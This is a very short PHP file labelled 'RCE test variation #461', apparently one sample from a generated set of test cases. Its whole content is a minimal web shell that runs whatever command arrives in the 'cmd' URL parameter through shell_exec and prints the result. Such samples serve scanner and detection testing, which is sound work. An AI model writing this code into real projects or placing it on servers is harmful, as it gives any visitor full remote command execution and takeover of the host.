<?php
// RCE test variation #461
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>